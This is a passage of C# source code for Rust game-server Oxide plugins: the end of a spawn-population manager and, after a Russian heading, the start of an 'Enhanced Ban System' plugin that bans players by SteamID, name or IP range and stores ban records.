            if (SpawnHandler.Instance == null || SpawnHandler.Instance.AllSpawnPopulations == null)
            {
                PrintError("The SpawnHandler is missing on your server, the plugin cannot be used");
                Interface.Oxide.UnloadPlugin(Name);
                return;
            }
            UpdateConfig();
            if (configData.pluginEnabled)
            {
                ApplySpawnHandler();
            }
        }

        #endregion Oxide Hooks

        #region Methods

        private void UpdateConfig()
        {
            var newPopulationSettings = new Dictionary<string, PopulationSetting>();
            for (int i = 0; i < SpawnHandler.Instance.AllSpawnPopulations.Length; i++)
            {
                var spawnPopulation = SpawnHandler.Instance.AllSpawnPopulations[i];
                if (spawnPopulation == null) continue;
                var spawnDistribution = SpawnHandler.Instance.SpawnDistributions[i];
                if (spawnDistribution == null) continue;
                int targetCount = SpawnHandler.Instance.GetTargetCount(spawnPopulation, spawnDistribution);
                PopulationSetting populationSetting;
                if (configData.populationSettings.TryGetValue(spawnPopulation.name, out populationSetting))
                {
                    if (!populationSetting.enabled)
                    {
                        populationSetting.targetCount = targetCount;
                    }
                    newPopulationSettings.Add(spawnPopulation.name, populationSetting);
                }
                else
                {
                    newPopulationSettings.Add(spawnPopulation.name, new PopulationSetting { targetCount = targetCount });
                }
            }
            configData.populationSettings = newPopulationSettings;
            SaveConfig();
        }

        private void ApplySpawnHandler()
        {
            foreach (var spawnPopulation in SpawnHandler.Instance.AllSpawnPopulations)
            {
                if (spawnPopulation == null) continue;
                PopulationSetting populationSetting;
                if (configData.populationSettings.TryGetValue(spawnPopulation.name, out populationSetting) && populationSetting.enabled)
                {
                    float num = TerrainMeta.Size.x * TerrainMeta.Size.z;
                    if (!spawnPopulation.ScaleWithLargeMaps)
                    {
                        num = Mathf.Min(num, 1.6E+07f);
                    }
                    var densityToMaxPopulation = num * 1E-06f * Spawn.max_density;
                    spawnPopulation.ScaleWithSpawnFilter = false;
                    spawnPopulation.ScaleWithServerPopulation = false;
                    spawnPopulation.EnforcePopulationLimits = true;
                    spawnPopulation.ScaleWithLargeMaps = true;
                    var targetDensity = populationSetting.targetCount / densityToMaxPopulation;
                    var convarControlledSpawnPopulation = spawnPopulation as ConvarControlledSpawnPopulation;
                    if (convarControlledSpawnPopulation != null)
                    {
                        ConsoleSystem.Command command = ConsoleSystem.Index.Server.Find(convarControlledSpawnPopulation.PopulationConvar);
                        command?.Set(targetDensity);
                    }
                    else spawnPopulation._targetDensity = targetDensity;
                }
            }
            SpawnHandler.Instance.EnforceLimits(true);
        }

        public string GetReport()
        {
            SpawnPopulation[] allSpawnPopulations = SpawnHandler.Instance.AllSpawnPopulations;
            SpawnDistribution[] spawnDistributions = SpawnHandler.Instance.SpawnDistributions;
            StringBuilder stringBuilder = new StringBuilder();
            if (allSpawnPopulations == null) stringBuilder.AppendLine("Spawn population array is null.");
            if (spawnDistributions == null) stringBuilder.AppendLine("Spawn distribution array is null.");
            if (allSpawnPopulations != null && spawnDistributions != null)
            {
                stringBuilder.AppendLine();
                stringBuilder.AppendLine("SpawnPopulationName".PadRight(40) + "CurrentPopulation".PadRight(25) + "MaximumPopulation");
                for (int i = 0; i < allSpawnPopulations.Length; i++)
                {
                    var spawnPopulation = allSpawnPopulations[i];
                    if (spawnPopulation == null) continue;
                    var spawnDistribution = spawnDistributions[i];
                    if (spawnDistribution == null) continue;
                    int currentCount = SpawnHandler.Instance.GetCurrentCount(spawnPopulation, spawnDistribution);
                    int targetCount = SpawnHandler.Instance.GetTargetCount(spawnPopulation, spawnDistribution);
                    stringBuilder.AppendLine(spawnPopulation.name.PadRight(40) + currentCount.ToString().PadRight(25) + targetCount);
                }
            }
            return stringBuilder.ToString();
        }

        #endregion Methods

        #region Commands

        [ConsoleCommand("er.fillpopulations")]
        private void CmdFillPopulations(ConsoleSystem.Arg arg)
        {
            SpawnHandler.Instance.FillPopulations();
            SendReply(arg, "Successfully filled all populations");
        }

        [ConsoleCommand("er.getreport")]
        private void CmdGetReport(ConsoleSystem.Arg arg) => SendReply(arg, GetReport());

        [ConsoleCommand("er.enforcelimits")]
        private void CmdEnforceLimits(ConsoleSystem.Arg arg)
        {
            SpawnHandler.Instance.EnforceLimits(true);
            SendReply(arg, "Successfully enforced all population limits");
        }

        #endregion Commands

        #region Configuration

        private ConfigData configData;

        private class ConfigData
        {
            [JsonProperty(PropertyName = "Enabled Plugin")]
            public bool pluginEnabled = false;

            [JsonProperty(PropertyName = "Population Settings")]
            public Dictionary<string, PopulationSetting> populationSettings = new Dictionary<string, PopulationSetting>();
        }

        private class PopulationSetting
        {
            [JsonProperty(PropertyName = "Enabled")]
            public bool enabled = true;

            [JsonProperty(PropertyName = "Target Count")]
            public int targetCount;
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                configData = Config.ReadObject<ConfigData>();
                if (configData == null)
                    LoadDefaultConfig();
            }
            catch (Exception ex)
            {
                PrintError($"The configuration file is corrupted. \n{ex}");
                LoadDefaultConfig();
            }
            SaveConfig();
        }

        protected override void LoadDefaultConfig()
        {
            PrintWarning("Creating a new configuration file");
            configData = new ConfigData();
        }

        protected override void SaveConfig() => Config.WriteObject(configData);

        #endregion Configuration
    }
}


###ПЛАГИН НА БАН(МОЖЕТ БАНИТЬ ПО АЙПИ ИГРОКА###


using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Database;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using System;
using System.Collections.Generic;
using System.Linq;
using Oxide.Core.SQLite.Libraries;
using System.Text.RegularExpressions;

namespace Oxide.Plugins
{
    
    [Info("Enhanced Ban System", "Reneb/Slut", "5.2.6")]
    class EnhancedBanSystem : CovalencePlugin
    {
        [PluginReference]
        private Plugin PlayerDatabase, DiscordMessages;

        ////////////////////////////////////////////////////////////
        // Static fields
        ////////////////////////////////////////////////////////////
        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        char[] ipChrArray = new char[] { '.' };

        private static BanSystem banSystem;

        static Hash<int, BanData> cachedBans = new Hash<int, BanData>();

        static List<int> wasBanned = new List<int>();

        ////////////////////////////////////////////////////////////
        // Config fields
        ////////////////////////////////////////////////////////////
        private static string Platform = "Steam";
        private static string Server = "1.1.1.1:28015";
        private static string Game = "Rust";

        string PermissionBan = "enhancedbansystem.ban";
        string PermissionUnban = "enhancedbansystem.unban";
        string PermissionBanlist = "enhancedbansystem.banlist";
        string PermissionKick = "enhancedbansystem.kick";

        private bool SQLite_use = false;
        private string SQLite_DB = "banlist.db";

        private bool MySQL_use = false;
        private string MySQL_Host = "localhost";
        private int MySQL_Port = 3306;
        private string MySQL_DB = "banlist";
        private string MySQL_User = "root";
        private string MySQL_Pass = "toor";

        private bool PlayerDatabase_use = false;
        private string PlayerDatabase_IPFile = "EnhancedBanSystem_IPs.json";

        private bool Files_use = false;

        private bool WebAPI_use = false;
        private string WebAPI_Ban_Request = "http://webpage.com/api.php?action=ban&pass=mypassword&id={id}&steamid={steamid}&name={name}&ip={ip}&reason={reason}&source={source}&game={game}&platform={platform}&server={server}&tempban={expiration}";
        private string WebAPI_Unban_Request = "http://webpage.com/api.php?action=unban&pass=mypassword&steamid={steamid}&name={name}&ip={ip}&name={name}&source={source}";
        private string WebAPI_IsBanned_Request = "http://webpage.com/api.php?action=isbanned&pass=mypassword&id={id}&update={update}&steamid={steamid}&ip={ip}&time={time}&name={name}&game=Rust&server=rust.kortal.org:28015";
        private string WebAPI_Banlist_Request = "http://webpage.com/banlist.php?startid={startid}";

        private bool Native_use = false;

        private string BanDefaultReason = "Banned";
        private string BanEvadeReason = "Ban Evade";

        private bool Kick_Broadcast = true;
        private bool Kick_Log = true;
        private bool Kick_OnBan = true;

        private bool Ban_Broadcast = true;
        private bool Ban_Log = true;
        private bool Discord_use = false;
        private string Discord_Webhook = "https://support.discordapp.com/hc/en-us/articles/228383668-Intro-to-Webhooks";

        private bool Ban_Escape = true;

        private bool Log_Denied = true;

        protected override void LoadDefaultConfig() { }

        private void CheckCfg<T>(string Key, ref T var)
        {
            if (Config[Key] is T)
                var = (T)Config[Key];
            else
                Config[Key] = var;
        }

        void Init()
        {
            CheckCfg<string>("Server Info - Platform", ref Platform);
            CheckCfg<string>("Server Info - Game", ref Game);
            CheckCfg<string>("Server Info - IP:PORT", ref Server);

            CheckCfg<string>("Permissions - Ban", ref PermissionBan);
            CheckCfg<string>("Permissions - Unban", ref PermissionUnban);
            CheckCfg<string>("Permissions - Banlist", ref PermissionBanlist);
            CheckCfg<string>("Permissions - Kick", ref PermissionKick);

            CheckCfg<bool>("DataType - SQLite - use", ref SQLite_use);
            CheckCfg<string>("DataType - SQLite - Database Filename", ref SQLite_DB);

            CheckCfg<bool>("DataType - MySQL - use", ref MySQL_use);
            CheckCfg<string>("DataType - MySQL - Host", ref MySQL_Host);
            CheckCfg<int>("DataType - MySQL - Port", ref MySQL_Port);
            CheckCfg<string>("DataType - MySQL - Database", ref MySQL_DB);
            CheckCfg<string>("DataType - MySQL - User", ref MySQL_User);
            CheckCfg<string>("DataType - MySQL - Pass", ref MySQL_Pass);

            CheckCfg<bool>("DataType - Files - use", ref Files_use);

            CheckCfg<bool>("DataType - PlayerDatabase - use", ref PlayerDatabase_use);
            CheckCfg<string>("DataType - PlayerDatabase - IP Filename", ref PlayerDatabase_IPFile);

            CheckCfg<bool>("DataType - WebAPI - use", ref WebAPI_use);
            CheckCfg<string>("DataType - WebAPI - Host", ref WebAPI_Ban_Request);
            CheckCfg<string>("DataType - WebAPI - Unban", ref WebAPI_Unban_Request);
            CheckCfg<string>("DataType - WebAPI - IsBanned", ref WebAPI_IsBanned_Request);
            CheckCfg<string>("DataType - WebAPI - Banlist", ref WebAPI_Banlist_Request);

            CheckCfg<bool>("DataType - Native - use", ref Native_use);

            CheckCfg<bool>("Ban - Evade", ref Ban_Escape);
            CheckCfg<string>("Ban - Default Reason", ref BanDefaultReason);
            CheckCfg<string>("Ban - Evade Reason", ref BanEvadeReason);
            CheckCfg<bool>("Ban - Broadcast", ref Ban_Broadcast);
            CheckCfg<bool>("Ban - Log", ref Ban_Log);
            CheckCfg<bool>("DiscordMessages - Use Discord", ref Discord_use);
            CheckCfg<string>("DiscordMessages - Discord Webhook", ref Discord_Webhook);

            CheckCfg<bool>("Kick - Broadcast", ref Kick_Broadcast);
            CheckCfg<bool>("Kick - Log", ref Kick_Log);
            CheckCfg<bool>("Kick - On Ban", ref Kick_OnBan);

            CheckCfg<bool>("Denied Connection - Log", ref Log_Denied);

            SaveConfig();

            if (SQLite_use) banSystem |= BanSystem.SQLite;
            if (MySQL_use) banSystem |= BanSystem.MySQL;
            if (Native_use) banSystem |= BanSystem.Native;
            if (PlayerDatabase_use) banSystem |= BanSystem.PlayerDatabase;
            if (Files_use) banSystem |= BanSystem.Files;
            if (WebAPI_use) banSystem |= BanSystem.WebAPI;

            InitializeLang();
        }

        void InitializeLang()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                { "PlayerNotFound", "No matching player was found.\n" },
                { "PlayerTempBanned", "You are temporarily banned from this server ({0}). {1} left" },
                { "PlayerPermBanned", "You are permanently banned from this server ({0})." },
                {"LoadedBans","Loaded {0} bans" },
                {"BanExists","This ban already exists ({0})." },
                {"BanAdded","Successfully added {0} to the banlist." },
                {"MultipleBans","Multiple Bans Found:\n\r" },
                {"BansRemoved","{0} matching bans were removed" },
                {"PlayerNotBanned","{0} - {1} isn't banned.\n" },
                {"Loaded","Loaded" },
                {"NoPermission","You don't have the permission to use this command." },
                {"KickSyntax","Syntax: kick < Name | SteamID | IP | IP Range > < reason(optional) >" },
                {"UnbanSyntax","Syntax: unban < Name | SteamID | IP | IP Range >" },
                {"BanSyntax","Syntax: ban < Name | SteamID | IP | IP Range > < reason(optional) > < time in secondes(optional) > " },
                {"BanlistSyntax","Syntax: banlist <BanSystem> <startid>" },
                {"BanSystems","Avaible BanSystems:\n" },
                {"BanlistSyntax1","Wrong usage of /banlist" },
                {"OutOfRange","Index is out of range. Current bans recorded: {0}" },
                {"Banlist","Banlist - {0}-{1}/{2}\n" },
                {"PlayerPermBan", "{0} was permanently banned from the server for {1}" },
                {"PlayerTempBan", "{0} was temporarily banned for {1} for {2}" },
                {"PlayerKick", "<color=red>{0}</color> <color=silver>was kicked from the server for</color> <color=red>{1}</color>" },
                {"IPPermBan", "An IP was banned from the server for {0}" },
                {"IPTempBan", "An IP was temporarily banned for {0} for {1}" },
                {"BanUpdated", "Succesfully updated {0} in the banlist." }
            }, this);
        }

        ////////////////////////////////////////////////////////////
        // ID Save
        ////////////////////////////////////////////////////////////

        private static DynamicConfigFile Ban_ID_File;
        private static int Ban_ID = 0;

        void Load_ID()
        {
            try
            {
                Ban_ID_File = Interface.Oxide.DataFileSystem.GetDatafile(Name + "_ID");
                Ban_ID = (int)Ban_ID_File["id"];
            }
            catch
            {
                Ban_ID = 0;
                Ban_ID_File["id"] = Ban_ID;
                Save_ID();
            }
        }

        void Save_ID()
        {
            Interface.Oxide.DataFileSystem.SaveDatafile(Name + "_ID");
        }

        static int GetNewID()
        {
            Ban_ID++;
            Ban_ID_File["id"] = Ban_ID;
            return Ban_ID;
        }

        ////////////////////////////////////////////////////////////
        // Enum & Class
        ////////////////////////////////////////////////////////////

        enum BanSystem
        {
            Native = 1,
            MySQL = 2,
            SQLite = 4,
            WebAPI = 8,
            PlayerDatabase = 16,
            Files = 32,
        }

        class BanData
        {
            public int id;
            public string steamid;
            public string ip;
            public string name;
            public string game;
            public string server;
            public string source;
            public double date;
            public double expire;
            public string reason;
            public string platform;

            public BanData() { }

            public BanData(object source, string userID, string name, string ip, string reason, double duration)
            {
                this.id = GetNewID();
                this.source = source is IPlayer ? ((IPlayer)source).Name : source is string ? (string)source : "Console";
                this.steamid = userID;
                this.name = name;
                this.ip = ip;
                this.reason = reason;
                this.expire = duration != 0.0 ? LogTime() + duration : 0.0;
                this.date = LogTime();
                this.platform = Platform;
                this.game = Game;
                this.server = Server;
            }

            public BanData(int id, string source, string userID, string name, string ip, string reason, string duration)
            {
                this.id = id;
                this.source = source;
                this.steamid = userID;
                this.name = name;
                this.ip = ip;
                this.reason = reason;
                this.expire = double.Parse(duration);
                this.date = LogTime();
                this.platform = Platform;
                this.game = Game;
                this.server = Server;
            }

            public string ToJson()
            {
                return JsonConvert.SerializeObject(this);
            }

            public override string ToString()
            {
                return string.Format("{0} - {1} - {2} - {3} - {4}", steamid, name, ip, reason, expire == 0.0 ? "Permanent" : expire < LogTime() ? "Expired" : string.Format("Temporary: {0}s", (expire - LogTime()).ToString()));
            }
        }

        ////////////////////////////////////////////////////////////
        // General Methods
        ////////////////////////////////////////////////////////////


        private bool IsPluginLoaded(Plugin plugin)
        {
            if (plugin != null)
            {
                return plugins.GetAll().Where(x => x.Equals(plugin) && x.IsLoaded) != null;
            }
            else
            {
                return false;
            }
        }
        string FormatTime(TimeSpan time) => $"{(time.Days == 0 ? string.Empty : $"{time.Days} day(s)")}{(time.Days != 0 && time.Hours != 0 ? $", " : string.Empty)}{(time.Hours == 0 ? string.Empty : $"{time.Hours} hour(s)")}{(time.Hours != 0 && time.Minutes != 0 ? $", " : string.Empty)}{(time.Minutes == 0 ? string.Empty : $"{time.Minutes} minute(s)")}{(time.Minutes != 0 && time.Seconds != 0 ? $", " : string.Empty)}{(time.Seconds == 0 ? string.Empty : $"{time.Seconds} second(s)")}";

        private bool TryParseTimeSpan(string source, out TimeSpan timeSpan)
        {
            int seconds = 0, minutes = 0, hours = 0, days = 0;

            Match s = new Regex(@"(\d+?)s", RegexOptions.IgnoreCase).Match(source);
            Match m = new Regex(@"(\d+?)m", RegexOptions.IgnoreCase).Match(source);
            Match h = new Regex(@"(\d+?)h", RegexOptions.IgnoreCase).Match(source);
            Match d = new Regex(@"(\d+?)d", RegexOptions.IgnoreCase).Match(source);

            if (s.Success)
                seconds = Convert.ToInt32(s.Groups[1].ToString());

            if (m.Success)
                minutes = Convert.ToInt32(m.Groups[1].ToString());

            if (h.Success)
                hours = Convert.ToInt32(h.Groups[1].ToString());

            if (d.Success)
                days = Convert.ToInt32(d.Groups[1].ToString());

            source = source.Replace(seconds + "s", string.Empty);
            source = source.Replace(minutes + "m", string.Empty);
            source = source.Replace(hours + "h", string.Empty);
            source = source.Replace(days + "d", string.Empty);

            if (!string.IsNullOrEmpty(source) || (!s.Success && !m.Success && !h.Success && !d.Success))
            {
                timeSpan = default(TimeSpan);
                return false;
            }

            timeSpan = new TimeSpan(days, hours, minutes, seconds);

            return true;
        }


        static double LogTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        string GetMsg(string key, object steamid = null, params object[] args)
        {

            if (args.Length != 0)
            {
                return string.Format(lang.GetMessage(key, this, steamid is IPlayer ? ((IPlayer)steamid).Id : steamid == null ? null : steamid.ToString()), args);
            }
            else
            {
                return lang.GetMessage(key, this, steamid is IPlayer ? ((IPlayer)steamid).Id : steamid == null ? null : steamid.ToString());
            }
        }

        bool hasPermission(IPlayer player, string permissionName)
        {
            if (player.IsAdmin) return true;
            return permission.UserHasPermission(player.Id.ToString(), permissionName);
        }

        bool isIPAddress(string arg)
        {
            int subIP;
            string[] strArray = arg.Split(ipChrArray);
            if (strArray.Length != 4)
            {
                return false;
            }
            foreach (string str in strArray)
            {
                if (str.Length == 0)
                {
                    return false;
                }
                if (!int.TryParse(str, out subIP) && str != "*")
                {
                    return false;
                }
                if (!(str == "*" || (subIP >= 0 && subIP <= 255)))
                {
                    return false;
                }
            }
            return true;
        }

        bool IPRange(string sourceIP, string targetIP)
        {
            string[] srcArray = sourceIP.Split(ipChrArray);
            string[] trgArray = targetIP.Split(ipChrArray);
            for (int i = 0; i < 4; i++)
            {
                if (srcArray[i] != trgArray[i] && srcArray[i] != "*")
                {
                    return false;
                }
            }
            return true;
        }

        bool RangeFromIP(string sourceIP, out string range1, out string range2, out string range3)
        {
            range1 = string.Empty;
            range2 = string.Empty;
            range3 = string.Empty;
            if (sourceIP == string.Empty) return false;

            string[] strArray = sourceIP.Split(ipChrArray);
            if (strArray.Length != 4)
            {
                return false;
            }

            range1 = string.Format("{0}.*.*.*", strArray[0]);
            range2 = string.Format("{0}.{1}.*.*", strArray[0], strArray[1]);
            range3 = string.Format("{0}.{1}.{2}.*", strArray[0], strArray[1], strArray[2]);

            return true;
        }

        List<IPlayer> FindPlayers(string userIDorNameorIP, object source, out string reason)
        {
            reason = string.Empty;
            var FoundPlayers = players.FindPlayers(userIDorNameorIP).ToList();
            if (FoundPlayers.Count == 0)
            {
                reason = GetMsg("PlayerNotFound", source) + "xd ";
            }
            if (FoundPlayers.Count > 1)
            {
                foreach (var iplayer in FoundPlayers)
                {
                    reason += string.Format("{0} {1}\r\n", iplayer.Id, iplayer.Name);
                }
            }
            return FoundPlayers;
        }

        List<IPlayer> FindConnectedPlayers(string userIDorNameorIP, object source, out string reason)
        {
            reason = string.Empty;
            ulong steamid = 0L;
            var FoundPlayers = new List<IPlayer>();
            ulong.TryParse(userIDorNameorIP, out steamid);
            if (isIPAddress(userIDorNameorIP))
            {
                FoundPlayers = players.All.Where(x => x.IsConnected).Where(w => IPRange(userIDorNameorIP, w.Address)).ToList();
            }
            else if (steamid != 0L)
            {
                var p = players.FindPlayer(userIDorNameorIP);
                if (p != null && p.IsConnected)
                {
                    FoundPlayers.Add(p);
                }
            }
            else
            {
                FoundPlayers = players.FindPlayers(userIDorNameorIP).Where(x => x.IsConnected).ToList();
                if (FoundPlayers.Count > 1)
                {
                    foreach (var iplayer in FoundPlayers)
                    {
                        reason += string.Format("{0} {1}\r\n", iplayer.Id, iplayer.Name);
                    }
                }
            }
            if (FoundPlayers.Count == 0)
            {
                reason = GetMsg("PlayerNotFound", source);
            }
            return FoundPlayers;
        }

        string GetPlayerIP(IPlayer iplayer)
        {
            try
            {
                if (iplayer.IsConnected) return iplayer.Address;
                return GetPlayerIP(iplayer.Id);
            }
            catch
            {
                return GetPlayerIP(iplayer.Id);
            }
        }
        string GetPlayerIP(string userID)
        {
            if (PlayerDatabase != null)
            {
                return (string)PlayerDatabase.Call("GetPlayerData", userID, "ip") ?? string.Empty;
            }
            return string.Empty;
        }

        string GetPlayerName(string userID)
        {
            if (PlayerDatabase != null)
            {
                return (string)PlayerDatabase.Call("GetPlayerData", userID, "name") ?? string.Empty;
            }
            return string.Empty;
        }
        bool HasDelayedAnswer() => BanSystemHasFlag(banSystem, BanSystem.MySQL) || BanSystemHasFlag(banSystem, BanSystem.SQLite) || (BanSystemHasFlag(banSystem, BanSystem.WebAPI));

        bool BanSystemHasFlag(BanSystem b, BanSystem t) => (b & t) == t;

        string FormatReturn(BanSystem system, string msg, params object[] args) => string.Format("{0}: {1}", system.ToString(), string.Format(msg, args));

        void SendReply(object source, string msg)
        {
            if (source is IPlayer) ((IPlayer)source).Reply(msg);
            else if (source is string) return;
            else Interface.Oxide.LogInfo(msg);
        }

        public static string ToShortString(TimeSpan timeSpan)
        {
            return string.Format("{0:00}:{1:00}:{2:00}", (int)timeSpan.TotalHours, timeSpan.Minutes, timeSpan.Seconds);
        }

        ////////////////////////////////////////////////////////////
        // Oxide Hooks
        ////////////////////////////////////////////////////////////


        void OnServerInitialized()
        {
            Load_ID();
            List<string> returnString = new List<string>();

            if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                 returnString.Add(PlayerDatabase_Load());
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                returnString.Add(Files_Load());
            }
            if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
            {
                returnString.Add(MySQL_Load());
            }
            if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
            {
                returnString.Add(SQLite_Load());
            }
            if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
            {
                returnString.Add(WebAPI_Load());
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Native))
            {
                returnString.Add(Native_Load());
            }

            if (returnString.Count == 0)
            {
                this.LogWarning("You must enable at least one Ban System to use this plugin!");
                Interface.Oxide.UnloadPlugin(Name);
            }

            permission.RegisterPermission(PermissionBan, this);
            permission.RegisterPermission(PermissionBanlist, this);
            permission.RegisterPermission(PermissionKick, this);
            permission.RegisterPermission(PermissionUnban, this);

            Interface.Oxide.LogInfo(string.Join("\n", returnString.ToArray()));

            if (Discord_use && (!IsPluginLoaded(DiscordMessages) || Discord_Webhook.Equals("https://support.discordapp.com/hc/en-us/articles/228383668-Intro-to-Webhooks")))
            {
                LogError("DiscordMessages enabled but it isn't setup correctly.");
                Discord_use = false;
            }
        }

        void Unload() => OnServerSave();

        void OnServerSave()
        {
            Save_ID();
            if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                Save_PlayerDatabaseIP();
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                Save_Files();
            }
        }
        private void OnUserBanned(string name, string id, string address, string reason)
        {
            timer.Once(5f, () =>
            {
                if (!isBanned_Check(name, id, address))
                {
                    Puts("Adding banned player to EnhancedBanSystem");
                    BanData bd = new BanData("Auto Ban", id, name, address, reason, 0.0);
                    ExecuteBan("Auto Ban", bd, false);
                }
            });
        }
        object CanUserLogin(string name, string id, string ip)
        {
            BanData bd = null;
            if (isBanned_NonDelayed(name, id, ip, Ban_Escape, out bd))
            {
                if (bd != null && bd.expire != 0.0)
                {
                    return GetMsg("PlayerTempBanned", id, bd.reason, FormatTime(TimeSpan.FromSeconds(bd.expire - LogTime())));
                }
                return GetMsg("PlayerPermBanned", id, bd == null ? string.Empty : bd.reason);
            }
            return null;
        }

        void OnUserConnected(IPlayer player)
        {
            if (player == null) return;
            string ip = player.Address;
            string name = player.Name;
            string steamid = player.Id;

            isBanned_Delayed(name, steamid, ip, Ban_Escape);
        }

        ////////////////////////////////////////////////////////////
        // Files
        ////////////////////////////////////////////////////////////

        StoredData storedData;

        class StoredData
        {
            public HashSet<string> Banlist = new HashSet<string>();
        }

        string Files_Load()
        {
            try
            {
                storedData = Interface.Oxide.DataFileSystem.ReadObject<StoredData>(Name);
            }
            catch
            {
                storedData = new StoredData();
            }
            foreach (var b in storedData.Banlist)
            {
                var bd = JsonConvert.DeserializeObject<BanData>(b);
                if (!cachedBans.ContainsKey(bd.id))
                    cachedBans.Add(bd.id, bd);
            }
            return FormatReturn(BanSystem.Files, GetMsg("LoadedBans", null), storedData.Banlist.Count.ToString());
        }

        void Save_Files()
        {
            if (storedData.Banlist == null)
            {
                return;
            }
            Interface.Oxide.DataFileSystem.WriteObject(Name, storedData);
        }

        string Files_UpdateBan(BanData bandata)
        {
            if (!cachedBans.ContainsKey(bandata.id)) return FormatReturn(BanSystem.Files, "No such ban id {0}", bandata.id);

            storedData.Banlist.Remove(cachedBans[bandata.id].ToJson());
            cachedBans.Remove(bandata.id);

            storedData.Banlist.Add(bandata.ToJson());

            if (!cachedBans.ContainsKey(bandata.id))
                cachedBans.Add(bandata.id, bandata);

            return FormatReturn(BanSystem.Files, GetMsg("BanUpdated"), bandata.ToString());
        }

        string Files_ExecuteBan(BanData bandata)
        {

            var f = cachedBans.Values.Where(x => x.ip == bandata.ip).Where(x => x.steamid == bandata.steamid).ToList();
            if (f.Count > 0)
            {
                var i = f.ToList();
                foreach (var id in i)
                {
                    if (id.expire == 0.0 || id.expire < LogTime()) continue;
                    storedData.Banlist.Remove(id.ToJson());
                    f.Remove(id);
                }
                if (f.Count > 0)
                {
                    return FormatReturn(BanSystem.Files, GetMsg("BanExists"), f[0].ToString());
                }
            }
            storedData.Banlist.Add(bandata.ToJson());
            Save_Files();
            if (!cachedBans.ContainsKey(bandata.id))
                cachedBans.Add(bandata.id, bandata);

            return FormatReturn(BanSystem.Files, GetMsg("BanAdded"), bandata.ToString());
        }

        string Files_RawUnban(List<BanData> unbanList)
        {
            int i = 0;
            foreach (var u in unbanList)
            {
                var json = u.ToJson();
                if (storedData.Banlist.Contains(json))
                {
                    i++;
                    storedData.Banlist.Remove(json);
                }
            }
            return FormatReturn(BanSystem.Files, GetMsg("BansRemoved"), i.ToString());
        }

        string Files_ExecuteUnban(string steamid, string name, string ip, out List<BanData> unbanList)
        {
            unbanList = new List<BanData>();
            if (ip != string.Empty)
            {
                unbanList = cachedBans.Values.Where(x => x.ip == ip).ToList();
            }
            else if (steamid != string.Empty)
            {
                unbanList = cachedBans.Values.Where(x => x.steamid == steamid).ToList();
            }
            else
            {
                var list = cachedBans.Values.Where(x => x.name.ToLower().Equals(name.ToLower())).ToList();
                if (list.Count > 1)
                {
                    var ret = FormatReturn(BanSystem.Files, GetMsg("MultipleBans"));
                    foreach (var b in list)
                    {
                        ret += string.Format("{0} - {1} - {2}\n\r", b.steamid, b.name, b.reason);
                    }
                    return ret;
                }
                else
                {
                    unbanList = list;
                }
            }
            return Files_RawUnban(unbanList);
        }

        bool Files_IsBanned(string steamid, string ip, out BanData bandata)
        {
            bandata = null;
            double cTime = LogTime();
            bool permanent = false;
            List<BanData> unbanList = new List<BanData>();
            List<BanData> list = new List<BanData>();
            // check by ID then IP
            var b_steamid = cachedBans.Values.Where(x => x.steamid == steamid).ToList();
            var b_steamid_ip = ip != null ? b_steamid.Where(w => w.ip == ip).ToList() : new List<BanData>();

            foreach (var b in b_steamid_ip)
            {
                if (b.expire != 0.0 && cTime >= b.expire)
                {
                    unbanList.Add(b);
                }
                else
                {
                    if (b.expire == 0.0)
                    {
                        permanent = true;
                    }
                    if (b.ip == ip)
                    {
                        bandata = b;
                    }
                }
            }
            if (unbanList.Count > 0)
            {
                Files_RawUnban(unbanList);
                foreach (var u in unbanList)
                {
                    b_steamid_ip.Remove(u);
                }
                unbanList.Clear();
            }
            foreach (var b in b_steamid)
            {
                if (b.expire != 0.0 && cTime >= b.expire)
                {
                    unbanList.Add(b);
                }
                else
                {
                    if (b.expire == 0.0)
                    {
                        permanent = true;
                    }
                    if (b.ip == ip)
                    {
                        bandata = b;
                    }
                }
            }
            if (unbanList.Count > 0)
            {
                Files_RawUnban(unbanList);
                foreach (var u in unbanList)
                {
                    b_steamid.Remove(u);
                }
                unbanList.Clear();
            }
            if (bandata == null)
            {
                if (b_steamid_ip.Count > 0)
                {
                    bandata = b_steamid_ip[0];
                }
                else if (b_steamid.Count > 0)
                {
                    bandata = b_steamid[0];
                }
            }
            if (bandata == null && !permanent)
            {
                // check by IP & IP Range
                list = ip != null ? cachedBans.Values.Where(x => x.ip != null && IPRange(x.ip, ip)).ToList() : new List<BanData>();
                foreach (var b in list)
                {
                    if (b.expire != 0.0 && cTime >= b.expire)
                    {
                        unbanList.Add(b);
                    }
                    else
                    {
                        if (b.expire == 0.0)
                        {
                            permanent = true;
                        }
                    }
                }
                if (unbanList.Count > 0)
                {
                    Files_RawUnban(unbanList);
                    foreach (var u in unbanList)
                    {
                        list.Remove(u);
                    }
                    unbanList.Clear();
                }
                if (list.Count > 0)
                {
                    bandata = list[0];
                }
            }
            if (bandata != null && bandata.expire != 0.0 && permanent)
            {
                bandata.expire = 0.0;
                Files_UpdateBan(bandata);
            }
            return bandata != null;
        }

        string Files_Banlist(object source, int startid)
        {
            if (startid > cachedBans.Count)
            {
                return FormatReturn(BanSystem.Files, "Index is out of range. Current bans recorded: {0}", cachedBans.Count.ToString());
            }

            int i = -1;
            int max = startid + 9;

            string returnstring = FormatReturn(BanSystem.Files, GetMsg("Banlist"), startid.ToString(), max.ToString(), cachedBans.Count.ToString());


            var bans = from pair in cachedBans orderby pair.Key descending select pair;

            foreach (KeyValuePair<int, BanData> b in bans)
            {
                i++;
                if (i < startid) continue;
                if (i > max) break;
                returnstring += b.ToString() + "\n";

            }

            return returnstring;
        }

        ////////////////////////////////////////////////////////////
        // PlayerDatabase
        ////////////////////////////////////////////////////////////

        static StoredIPData storedIPData;

        class StoredIPData
        {
